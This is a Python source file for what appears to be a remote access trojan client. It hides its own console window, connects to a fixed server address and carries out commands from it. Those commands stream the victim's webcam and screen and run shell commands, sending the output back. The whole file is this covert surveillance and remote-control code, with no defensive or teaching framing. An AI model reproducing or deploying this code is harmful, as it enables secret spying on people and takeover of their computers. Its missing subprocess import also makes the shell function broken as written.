import socket
import ctypes
import cv2
import pyautogui
import numpy as np
import time

# Hide the client window using ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def start_client():
    # Connect to the server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('10.0.1.33', 9999))  # Replace 'SERVER_IP' with the actual server IP

    while True:
        try:
            # Receive command from server
            command = client.recv(1024).decode()

            if command.startswith("!webcam_stream"):
                # Start webcam stream
                capture_webcam(client)
            elif command.startswith("!screen_stream"):
                # Start screen stream
                capture_screen(client)
            elif command.startswith("!shell"):
                # Execute shell commands
                execute_shell_command(client, command.split()[1:])
            else:
                print("Unknown command received")
        except Exception as e:
            print(f"Error handling command: {e}")
            break

def capture_webcam(client):
    # Start capturing webcam using OpenCV
    cap = cv2.VideoCapture(0)  # 0 is the default webcam

    if not cap.isOpened():
        print("Error: Could not open webcam.")
        return

    print("Starting webcam capture...")
    while True:
        ret, frame = cap.read()
        if not ret:
            print("Error: Failed to capture frame from webcam.")
            break

        # Convert frame to JPEG
        _, jpeg_frame = cv2.imencode('.jpg', frame)

        # Send the JPEG image to the server
        client.send(jpeg_frame.tobytes())

    cap.release()  # Release the webcam when done

def capture_screen(client):
    print("Starting screen capture...")
    while True:
        # Take a screenshot using pyautogui
        screenshot = pyautogui.screenshot()

        # Convert screenshot to numpy array
        frame = np.array(screenshot)

        # Convert to BGR (OpenCV uses BGR format)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        # Encode image to JPEG format
        _, jpeg_frame = cv2.imencode('.jpg', frame)

        # Send the JPEG frame to the server
        client.send(jpeg_frame.tobytes())

        time.sleep(0.1)  # To control the frame rate

def execute_shell_command(client, command_list):
    try:
        # Execute shell command
        result = subprocess.check_output(command_list, stderr=subprocess.STDOUT)
        client.send(result)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")

if __name__ == "__main__":
    start_client()
